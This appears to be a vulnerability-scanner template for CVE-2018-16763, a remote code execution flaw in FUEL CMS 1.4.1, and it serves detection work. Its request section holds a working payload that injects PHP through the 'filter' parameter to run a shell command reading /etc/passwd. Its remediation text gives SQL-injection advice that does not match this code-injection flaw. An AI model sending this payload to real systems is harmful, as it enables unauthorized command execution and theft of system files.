id: CVE-2018-16763
info:
  name: FUEL CMS 1.4.1 - Remote Code Execution
  author:
  - pikpikcu
  tags:
  - cve
  - cve2018
  - fuelcms
  - rce
  description: |-
    FUEL CMS 注入漏洞
    FUEL CMS是一款基于Codelgniter框架的内容管理系统（CMS）。

    FUEL CMS 1.4.1版本中的pages/select/页面的‘filter’参数和preview/页面的‘data’参数存在注入漏洞。该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。
  reference:
  - https://www.exploit-db.com/exploits/47138
  - https://www.getfuelcms.com/
  - https://github.com/daylightstudio/fuel-cms/releases/tag/1.4.1
  - https://nvd.nist.gov/vuln/detail/cve-2018-16763
  severity: critical
  classification:
    cve-id:
    - cve-2018-16763
    cwe-id:
    - cwe-74
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：http://www.getfuelcms.com/

    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  raw:
  - |
    GET /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27 HTTP/1.1
    Host: {{Hostname}}
